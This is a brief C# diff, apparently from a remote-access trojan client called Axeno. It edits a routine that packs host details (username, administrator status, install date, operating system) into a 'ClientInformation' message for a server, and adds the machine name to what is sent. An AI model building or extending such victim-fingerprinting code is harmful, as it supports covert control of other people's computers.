@@ -18,7 +18,7 @@ namespace Axeno.Client.Helper
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInformation";
             msgpack.ForcePathObject("Group").AsString = "Default";
-            msgpack.ForcePathObject("Username").AsString = Environment.UserName.ToString();
+            msgpack.ForcePathObject("Username").AsString = Environment.UserName.ToString() + "/" + Environment.MachineName;
             msgpack.ForcePathObject("Applevel").AsString = IsAdministrator();
             msgpack.ForcePathObject("Instdate").AsString = InstallDate();
             msgpack.ForcePathObject("Operatingsystem").AsString = OperatingSystemInfo();
